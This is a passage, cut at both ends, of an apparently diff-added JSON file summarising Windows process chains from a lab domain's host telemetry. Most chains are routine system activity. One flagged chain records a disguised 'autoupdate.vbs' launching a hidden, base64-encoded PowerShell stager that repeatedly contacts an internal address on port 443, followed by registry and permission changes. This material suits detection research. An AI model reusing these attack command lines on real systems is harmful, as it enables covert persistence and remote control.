+  "end": "2019-05-14 23:13:56.193000+00:00",
+  "duration_s": 61.7,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 72,
+  "events_by_type": {
+   "image_load": 68,
+   "registry_event": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => backgroundtaskhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:App.AppXemn3t55segp7q92mwd35v2a5rk5mvwyz.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0111",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 23:12:54.532000+00:00",
+  "end": "2019-05-14 23:17:54.640000+00:00",
+  "duration_s": 300.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 27,
+  "events_by_type": {
+   "image_load": 24,
+   "process_create": 1,
+   "file_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\svchost.exe -k wsappx -p -s ClipSVC"
+  ]
+ },
+ {
+  "chain_id": "CH-0112",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "runtimebroker.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:12:55.260000+00:00",
+  "end": "2019-05-14 23:14:26.233000+00:00",
+  "duration_s": 91.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 151,
+  "events_by_type": {
+   "process_access": 83,
+   "image_load": 52,
+   "registry_event": 6,
+   "file_create": 5,
+   "other": 2,
+   "process_create": 1,
+   "pipe_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => runtimebroker.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0113",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:13:26.502000+00:00",
+  "end": "2019-05-14 23:13:27.296000+00:00",
+  "duration_s": 0.8,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 31,
+  "events_by_type": {
+   "image_load": 29,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe Install $(Arg0)"
+  ]
+ },
+ {
+  "chain_id": "CH-0114",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "trustedinstaller.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 23:13:26.540000+00:00",
+  "end": "2019-05-14 23:15:28.276000+00:00",
+  "duration_s": 121.7,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 29,
+  "events_by_type": {
+   "image_load": 24,
+   "registry_event": 2,
+   "process_create": 1,
+   "process_access": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => trustedinstaller.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\servicing\\TrustedInstaller.exe"
+  ]
+ },
+ {
+  "chain_id": "CH-0115",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "tiworker.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:13:26.621000+00:00",
+  "end": "2019-05-14 23:15:28.272000+00:00",
+  "duration_s": 121.7,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 51,
+  "events_by_type": {
+   "image_load": 43,
+   "registry_event": 5,
+   "process_create": 1,
+   "process_access": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => tiworker.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\winsxs\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.402_none_7e502ee34cd6a6f5\\TiWorker.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0116",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:14:58.139000+00:00",
+  "end": "2019-05-14 23:14:59.839000+00:00",
+  "duration_s": 1.7,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 77,
+  "events_by_type": {
+   "image_load": 51,
+   "registry_event": 21,
+   "network_connect": 2,
+   "process_create": 1,
+   "pipe_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [
+   "172.18.39.5:389 x2"
+  ],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe SYSTEM"
+  ]
+ },
+ {
+  "chain_id": "CH-0117",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchprotocolhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 23:15:52.403000+00:00",
+  "end": "2019-05-14 23:17:41.596000+00:00",
+  "duration_s": 109.2,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 48,
+  "events_by_type": {
+   "image_load": 42,
+   "registry_event": 4,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchprotocolhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe29_ Global\\UsGthrCtrlFltPipeMssGthrPipe29 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6"
+  ]
+ },
+ {
+  "chain_id": "CH-0118",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchfilterhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 23:15:52.465000+00:00",
+  "end": "2019-05-14 23:17:41.602000+00:00",
+  "duration_s": 109.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 31,
+  "events_by_type": {
+   "image_load": 28,
+   "process_create": 1,
+   "registry_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchfilterhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 768 772 780 8192 776 "
+  ]
+ },
+ {
+  "chain_id": "CH-0119",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "cmd.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 23:16:09.942000+00:00",
+  "end": "2019-05-14 23:47:41.425000+00:00",
+  "duration_s": 1891.5,
+  "n_processes": 8,
+  "max_depth": 3,
+  "n_events": 1022,
+  "events_by_type": {
+   "network_connect": 378,
+   "registry_event": 345,
+   "image_load": 263,
+   "process_access": 11,
+   "pipe_event": 9,
+   "process_create": 8,
+   "file_create": 8
+  },
+  "narrative": "services.exe => cmd.exe -> wscript.exe -> powershell.exe -> conhost.exe -> reg.exe -> takeown.exe -> icacls.exe (x2)",
+  "network_endpoints": [
+   "10.0.10.106:443 x378"
+  ],
+  "any_encoded_cmd": true,
+  "notable": true,
+  "sample_cmdlines": [
+   "cmd.exe /c \"C:\\Users\\pgustavo\\AppData\\Roaming\\Adobe\\Flash Player\\autoupdate.vbs\" ",
+   "\"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\pgustavo\\AppData\\Roaming\\Adobe\\Flash Player\\autoupdate.vbs\"  ",
+   "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQ",
+   "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"
+  ]
+ },
+ {
+  "chain_id": "CH-0120",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:16:49.467000+00:00",
+  "end": "2019-05-14 23:16:49.502000+00:00",
+  "duration_s": 0.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 37,
+  "events_by_type": {
+   "image_load": 32,
+   "registry_event": 3,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe NGCKeyPregen"
+  ]
+ },
+ {
+  "chain_id": "CH-0121",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\NETWORK SERVICE",
+  "root_process": "gpupdate.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:18:08.386000+00:00",
+  "end": "2019-05-14 23:18:14.605000+00:00",
+  "duration_s": 6.2,
+  "n_processes": 2,
+  "max_depth": 1,
+  "n_events": 54,
+  "events_by_type": {
+   "image_load": 49,
+   "process_create": 2,
+   "process_terminate": 2,
+   "process_access": 1
+  },
+  "narrative": "svchost.exe => gpupdate.exe -> conhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "gpupdate.exe /target:user",
+   "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"
+  ]
+ },
+ {
+  "chain_id": "CH-0122",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 23:18:08.672000+00:00",
+  "end": "2019-05-14 23:28:08.750000+00:00",
+  "duration_s": 600.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 61,
+  "events_by_type": {
+   "image_load": 54,
+   "pipe_event": 3,
+   "network_connect": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [
+   "172.18.39.5:389 x2"
+  ],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s gpsvc"
+  ]
+ },
+ {
+  "chain_id": "CH-0123",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "logonui.exe",
+  "root_parent": "winlogon.exe",
+  "start": "2019-05-14 23:18:56.488000+00:00",
+  "end": "2019-05-14 23:32:46.384000+00:00",
+  "duration_s": 829.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 284,
+  "events_by_type": {
+   "image_load": 139,
+   "registry_event": 129,
+   "other": 12,
+   "process_create": 1,
+   "process_access": 1,
+   "pipe_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "winlogon.exe => logonui.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"LogonUI.exe\" /flags:0x0 /state0:0xa3387055 /state1:0x41c64e6d"
+  ]
+ },
+ {
+  "chain_id": "CH-0124",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:18:57.577000+00:00",
+  "end": "2019-05-14 23:18:58.234000+00:00",
+  "duration_s": 0.7,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 29,
+  "events_by_type": {
+   "image_load": 25,
+   "registry_event": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe KEYROAMING"
+  ]
+ },
+ {
+  "chain_id": "CH-0125",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "logonui.exe",
+  "root_parent": "winlogon.exe",
+  "start": "2019-05-14 23:21:38.048000+00:00",
+  "end": "2019-05-14 23:42:04.272000+00:00",
+  "duration_s": 1226.2,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 153,
+  "events_by_type": {
+   "image_load": 83,
+   "registry_event": 67,
+   "process_access": 2,
+   "process_create": 1
+  },
+  "narrative": "winlogon.exe => logonui.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"LogonUI.exe\" /flags:0x0 /state0:0xa2dc8855 /state1:0x41c64e6d"
+  ]
+ },
+ {
+  "chain_id": "CH-0126",
+  "host": "HFDC01",
+  "user": "SHIRE\\Administrator",
+  "root_process": "lockapphost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:21:38.184000+00:00",
+  "end": "2019-05-14 23:21:38.260000+00:00",
+  "duration_s": 0.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 29,
+  "events_by_type": {
+   "image_load": 28,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => lockapphost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\LockAppHost.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0127",
+  "host": "HFDC01",
+  "user": "SHIRE\\Administrator",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:21:38.455000+00:00",
+  "end": "2019-05-14 23:21:38.792000+00:00",
+  "duration_s": 0.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 25,
+  "events_by_type": {
+   "image_load": 22,
+   "registry_event": 2,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe KEYROAMING"
+  ]
+ },
+ {
+  "chain_id": "CH-0128",
+  "host": "IT001",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "backgroundtaskhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:24:14.991000+00:00",
+  "end": "2019-05-14 23:25:16.076000+00:00",
+  "duration_s": 61.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 302,
+  "events_by_type": {
+   "registry_event": 182,
+   "image_load": 115,
+   "other": 2,
+   "process_create": 1,
+   "network_connect": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => backgroundtaskhost.exe",
+  "network_endpoints": [
+   "204.79.197.200:443 x1"
+  ],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0129",
+  "host": "IT001",
+  "user": "NT AUTHORITY\\NETWORK SERVICE",
+  "root_process": "gpupdate.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:26:05.030000+00:00",
+  "end": "2019-05-14 23:26:11.933000+00:00",
+  "duration_s": 6.9,
+  "n_processes": 2,
+  "max_depth": 1,
+  "n_events": 54,
+  "events_by_type": {
+   "image_load": 49,
+   "process_create": 2,
+   "process_terminate": 2,
+   "process_access": 1
+  },
+  "narrative": "svchost.exe => gpupdate.exe -> conhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "gpupdate.exe /target:computer",
+   "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"
+  ]
+ },
+ {
+  "chain_id": "CH-0130",
+  "host": "IT001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 23:26:05.194000+00:00",
+  "end": "2019-05-14 23:36:05.249000+00:00",
+  "duration_s": 600.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 153,
+  "events_by_type": {
+   "image_load": 90,
+   "file_create": 52,
+   "network_connect": 6,
+   "pipe_event": 3,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [
+   "172.18.39.5:389 x6"
+  ],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s gpsvc"
+  ]
+ },
+ {
+  "chain_id": "CH-0131",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\NETWORK SERVICE",
+  "root_process": "sppsvc.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 23:28:08.537000+00:00",
+  "end": "2019-05-14 23:28:38.906000+00:00",
+  "duration_s": 30.4,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 43,
+  "events_by_type": {
+   "image_load": 36,
+   "registry_event": 4,
+   "process_access": 2,
+   "process_create": 1
+  },
+  "narrative": "services.exe => sppsvc.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\sppsvc.exe"
+  ]
+ },
+ {
+  "chain_id": "CH-0132",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchprotocolhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 23:30:52.433000+00:00",
+  "end": "2019-05-14 23:33:41.625000+00:00",
+  "duration_s": 169.2,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 35,
+  "events_by_type": {
+   "image_load": 32,
+   "process_create": 1,
+   "registry_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchprotocolhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe30_ Global\\UsGthrCtrlFltPipeMssGthrPipe30 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6"
+  ]
+ },
+ {
+  "chain_id": "CH-0133",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchfilterhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 23:30:52.466000+00:00",
+  "end": "2019-05-14 23:33:41.629000+00:00",
+  "duration_s": 169.2,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 25,
+  "events_by_type": {
+   "image_load": 23,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchfilterhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 768 772 780 8192 776 "
+  ]
+ },
+ {
+  "chain_id": "CH-0134",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\NETWORK SERVICE",
+  "root_process": "sppsvc.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 23:32:06.844000+00:00",
+  "end": "2019-05-14 23:32:37.167000+00:00",
+  "duration_s": 30.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 44,
+  "events_by_type": {
+   "image_load": 38,
+   "registry_event": 2,
+   "process_access": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => sppsvc.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\sppsvc.exe"
+  ]
+ },
+ {
+  "chain_id": "CH-0135",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "backgroundtaskhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:32:37.838000+00:00",
+  "end": "2019-05-14 23:33:39.404000+00:00",
+  "duration_s": 61.6,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 72,
+  "events_by_type": {
+   "image_load": 68,
+   "registry_event": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => backgroundtaskhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:App.AppXemn3t55segp7q92mwd35v2a5rk5mvwyz.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0136",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 23:32:37.875000+00:00",
+  "end": "2019-05-14 23:37:38.014000+00:00",
+  "duration_s": 300.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 27,
+  "events_by_type": {
+   "image_load": 24,
+   "process_create": 1,
+   "file_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\svchost.exe -k wsappx -p -s ClipSVC"
+  ]
+ },
+ {
+  "chain_id": "CH-0137",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "runtimebroker.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:32:38.496000+00:00",
+  "end": "2019-05-14 23:34:09.432000+00:00",
+  "duration_s": 90.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 151,
+  "events_by_type": {
+   "process_access": 83,
+   "image_load": 52,
+   "registry_event": 6,
+   "file_create": 5,
+   "other": 2,
+   "process_create": 1,
+   "pipe_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => runtimebroker.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0138",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:32:46.685000+00:00",
+  "end": "2019-05-14 23:32:46.951000+00:00",
+  "duration_s": 0.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 29,
+  "events_by_type": {
+   "image_load": 25,
+   "registry_event": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe KEYROAMING"
+  ]
+ },
+ {
+  "chain_id": "CH-0139",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "backgroundtaskhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:32:46.884000+00:00",
+  "end": "2019-05-14 23:33:49.357000+00:00",
+  "duration_s": 62.5,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 103,
+  "events_by_type": {
+   "image_load": 89,
+   "registry_event": 12,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => backgroundtaskhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0140",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "backgroundtaskhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:32:47.323000+00:00",
+  "end": "2019-05-14 23:33:48.122000+00:00",
+  "duration_s": 60.8,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 73,
+  "events_by_type": {
+   "image_load": 63,
+   "registry_event": 8,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => backgroundtaskhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0141",
+  "host": "IT001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchprotocolhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 23:37:15.729000+00:00",
+  "end": "2019-05-14 23:38:27.734000+00:00",
+  "duration_s": 72.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 35,
+  "events_by_type": {
+   "image_load": 32,
+   "process_create": 1,
+   "registry_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchprotocolhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe25_ Global\\UsGthrCtrlFltPipeMssGthrPipe25 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6"
+  ]
+ },
+ {
+  "chain_id": "CH-0142",
+  "host": "IT001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchfilterhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 23:37:15.764000+00:00",
+  "end": "2019-05-14 23:38:27.739000+00:00",
+  "duration_s": 72.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 25,
+  "events_by_type": {
+   "image_load": 23,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchfilterhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 768 772 780 8192 776 "
+  ]
+ },
+ {
+  "chain_id": "CH-0143",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:37:49.531000+00:00",
+  "end": "2019-05-14 23:37:50.439000+00:00",
+  "duration_s": 0.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 31,
+  "events_by_type": {
+   "image_load": 29,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe Install $(Arg0)"
+  ]
+ },
+ {
+  "chain_id": "CH-0144",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "trustedinstaller.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 23:37:49.575000+00:00",
+  "end": "2019-05-14 23:39:51.462000+00:00",
+  "duration_s": 121.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 29,
+  "events_by_type": {
+   "image_load": 24,
+   "registry_event": 2,
+   "process_create": 1,
+   "process_access": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => trustedinstaller.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\servicing\\TrustedInstaller.exe"
+  ]
+ },
+ {
+  "chain_id": "CH-0145",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "tiworker.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:37:49.693000+00:00",
+  "end": "2019-05-14 23:39:51.458000+00:00",
+  "duration_s": 121.8,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 51,
+  "events_by_type": {
+   "image_load": 43,
+   "registry_event": 5,
+   "process_create": 1,
+   "process_access": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => tiworker.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\winsxs\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.402_none_7e502ee34cd6a6f5\\TiWorker.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0146",
+  "host": "IT001",
+  "user": "NT AUTHORITY\\NETWORK SERVICE",
+  "root_process": "sppsvc.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 23:39:52.750000+00:00",
+  "end": "2019-05-14 23:40:23.078000+00:00",
+  "duration_s": 30.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 44,
+  "events_by_type": {
+   "image_load": 38,
+   "registry_event": 2,
+   "process_access": 2,
+   "process_create": 1,
